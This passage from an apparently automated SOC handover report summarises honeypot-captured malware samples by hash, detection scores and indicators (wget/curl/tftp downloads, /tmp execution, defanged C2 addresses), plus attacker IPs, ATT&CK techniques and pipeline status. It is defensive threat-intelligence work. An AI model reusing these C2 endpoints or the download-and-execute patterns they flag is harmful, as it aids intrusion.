| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **37/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 20 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `172.184.241[.]11` | US | Microsoft Limited | **100** ⚠️ | 5 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `118.193.45[.]134` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 3 |
| `2.58.172[.]185` | GB | rack400.com - UK Infrastructure Tel : +6531595852 | **100** ⚠️ | 1 |
| `91.92.40[.]176` | NL | TechTies Inc. | **100** ⚠️ | 33 |
| `194.165.16[.]167` | LT | Flyservers S.A. | **100** ⚠️ | 50 |
| `118.252.27[.]84` | CN | CHINANET Hunan province network | **100** ⚠️ | 6 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 210 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 196 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 57 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 57 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 460 cases |
| Tool 34  | Credential Extractor        | ✅ 252 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 196 priority case(s) shown individually · 34 recon entry/entries in table (15 group(s) consolidating 241 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-06T20:03:57Z_
